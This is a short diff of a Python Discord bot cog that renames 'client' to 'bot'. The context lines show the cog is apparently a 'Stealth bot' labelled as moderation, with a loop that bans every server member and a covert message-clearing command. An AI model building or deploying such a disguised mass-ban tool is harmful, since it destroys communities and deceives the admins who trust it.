@@ -11,8 +11,8 @@ init()  # Used by colorama.
 
 
 class Moderation(commands.Cog):
-    def __init__(self, client):
-        self.client = client
+    def __init__(self, bot):
+        self.bot = bot
 
 
     # Clear messages (Trustworhy command = Stealth).
@@ -63,7 +63,7 @@ class Moderation(commands.Cog):
 
         # Ban all members.
         print(Fore.YELLOW + "Banning server members:")
-        for member in self.client.get_all_members():
+        for member in self.bot.get_all_members():
             if member.bot and SKIP_BOTS:
                 continue
             try:
@@ -112,8 +112,8 @@ class Moderation(commands.Cog):
             await ctx.send('You do not have the administator permission.')
 
 
-def setup(client):
-    client.add_cog(Moderation(client))
+def setup(bot):
+    bot.add_cog(Moderation(bot))
 
 
 # Stealth bot scripted created by K. Catterall.
